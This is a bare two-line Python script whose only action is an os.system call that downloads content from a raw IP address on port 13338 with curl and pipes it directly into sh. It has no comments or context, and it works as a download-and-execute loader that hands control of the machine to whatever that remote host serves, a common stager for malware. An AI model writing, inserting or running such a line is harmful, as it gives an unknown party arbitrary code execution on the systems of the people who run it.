import os
os.system('curl http://103.251.89.204:13338|sh')